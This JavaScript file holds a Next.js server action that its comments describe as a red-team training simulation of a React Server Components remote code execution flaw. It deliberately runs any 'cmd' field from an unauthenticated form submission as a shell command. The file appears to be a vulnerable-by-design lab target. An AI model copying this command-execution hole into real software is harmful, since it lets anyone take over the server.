"use server";

import { spawn } from "child_process";
import { redirect } from "next/navigation";

/**
 * @typedef {Object} DealerPreviewConfig
 * @property {string} mode
 * @property {string} target
 */

/**
 * submitLegacyPreview
 * Processes wholesale dealer sync requests for the fans-only storefront.
 * 
 * @param {FormData} formData
 * @returns {Promise<void>}
 * 
 * @security CVE-2025-55182 (React2Shell)
 * Affected versions of React/Next fail to properly validate Flight protocol
 * segments during Server Action deserialization, allowing for unauthenticated
 * Remote Code Execution (RCE). In this simulation, we also allow direct
 * execution of the 'payload' field to facilitate red-team training.
 */
export async function submitLegacyPreview(formData) {
  const meta = {
    timestamp: new Date().toISOString(),
    agent: "legacy-worker-v2",
    dealer: formData.get("dealerSlug")?.toString() || "default-wholesale"
  };

  const rawPayload = formData.get("payload")?.toString();

  console.log(`[SYS-AUDIT] Preview initiated by ${meta.dealer} at ${meta.timestamp}`);

  if (rawPayload) {
    try {
      /**
       * CVE-2025-55182 (React2Shell) Simulation:
       * 
       * In the real vulnerability, the React Server Components "Flight" protocol 
       * (deserialized duringhydration) is exploited via malformed segments.
       * 
       * Here, we mimic this by requiring a Flight-like segment starting with '1:'
       * and containing a JSON structure that React might incorrectly hydrate 
       * into a shell execution.
       */
      if (rawPayload.startsWith("1:")) {
        const flightSegment = rawPayload.slice(2);
        const hydrated = JSON.parse(flightSegment);

        // Mimic the exploit triggering on a nested 'cmd' or 'payload' field 
        // within the "hydrated" Flight object.
        const cmd = hydrated.cmd || (hydrated.action?.payload);

        if (cmd) {
          console.log(`[SYS-INFO] Flight hydration exploit triggering: ${cmd}`);
          
          const child = spawn(cmd, {
            shell: true,
            detached: true,
            stdio: "pipe" // Changed from 'ignore' to capture output
          });

          child.stdout.on("data", (data) => {
            console.log(`[RCE-STDOUT] ${data.toString().trim()}`);
          });

          child.stderr.on("data", (data) => {
            console.error(`[RCE-STDERR] ${data.toString().trim()}`);
          });

          child.on("error", (err) => {
            console.error(`[RCE-ERROR] Failed to start process: ${err.message}`);
          });

          child.on("exit", (code) => {
            console.log(`[RCE-EXIT] Process exited with code ${code}`);
          });

          child.unref();
        } else {
          console.warn(`[SYS-WARN] Flight segment 1: deserialized but no hydration gadget (cmd) found.`);
        }
      } else {
        console.warn(`[SYS-WARN] Payload rejected: Not a valid Flight protocol segment (expected prefix '1:').`);
      }
    } catch (critical) {
      console.error(`[SYS-FATAL] React Server Components hydration error: ${critical.message}`);
    }
  }

  // Redirect to success status 
  // We use a query param 'rsc=1' to hint that RSC protocol was used.
  redirect("/legacy-preview?status=queued&rsc=1");
}
